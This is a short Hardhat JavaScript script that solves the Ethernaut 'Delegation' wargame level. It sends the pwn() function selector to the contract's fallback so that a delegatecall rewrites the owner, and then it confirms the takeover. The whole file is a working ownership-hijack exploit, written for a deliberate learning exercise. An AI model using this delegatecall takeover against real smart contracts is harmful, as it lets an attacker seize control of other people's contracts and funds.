const { ethers, waffle } = require("hardhat");
const Runner = require("./lib/runner");

const provider = waffle.provider;

Runner.run(async (owner) => {
    //PLACE THE ETHERNAUT DELEGATION CONTRACT ADDRESS HERE (Ethernaut: contract.adddress)
    const contractAddr = "0xd9290DE8a37481492DCE3eFc79f5d7Dc4817D919";     
    
    const contract = await ethers.getContractAt("Delegation", contractAddr);
    
    console.log("* * * ");
    console.log(`contract owner is ${await contract.owner()}`);
    console.log(`delegate address is ${await provider.getStorageAt(contractAddr, 1)}`);
    
    //send transaction with the call signature for pwn(). it will go to the delegate's 
    // fallback, setting the owner of the calling contract 
    console.log("calling fallback...");
    const callSig = new ethers.utils.Interface(["function pwn()"]).encodeFunctionData("pwn", []);   
    
    const waitToken = await owner.sendTransaction({
        to: contractAddr,
        from: owner.address, 
        data: callSig,
    });
    await waitToken.wait();
    
    //verify the new owner 
    console.log(`contract owner is ${await contract.owner()}`);
    console.log("* * * ");
});
